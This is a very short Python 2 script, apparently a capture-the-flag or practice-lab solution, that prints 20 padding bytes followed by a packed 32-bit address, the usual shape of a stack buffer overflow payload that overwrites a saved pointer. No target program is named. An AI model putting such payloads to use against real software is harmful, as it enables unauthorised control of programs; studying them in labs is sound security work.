import struct

addr = struct.pack("I", 0x08049928)
padding = "\x41" * 20

print padding + addr
